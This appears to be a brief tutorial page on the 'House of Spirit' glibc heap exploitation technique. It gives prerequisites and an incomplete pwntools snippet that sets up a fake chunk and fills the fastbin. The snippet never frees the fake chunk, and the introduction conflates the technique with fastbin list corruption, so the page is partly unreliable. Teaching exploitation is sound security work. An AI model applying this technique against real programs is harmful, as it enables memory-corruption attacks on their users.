Heap Exploitation: House of Spirit

heap glibc fastbin use-after-free

Introduction

The House of Spirit is a powerful heap exploitation technique that allows an attacker to allocate a chunk at an arbitrary address by corrupting the fastbin linked list.

Prerequisites

  • Ability to free a fake chunk with controlled size field
  • Ability to allocate chunks of similar size
  • Knowledge of heap metadata structure

Exploitation

exploit.py 
from pwn import *

context.arch = 'amd64'

# Setup fake chunk on stack
fake_chunk = p64(0x0) + p64(0x41)

# Allocate and free to populate fastbin
allocate(0x38, b'A'*0x38)
allocate(0x38, b'B'*0x38)
free(0)
free(1)
⚠️ Important

The fake chunk's size field must align to 0x10 and fall within the fastbin range.
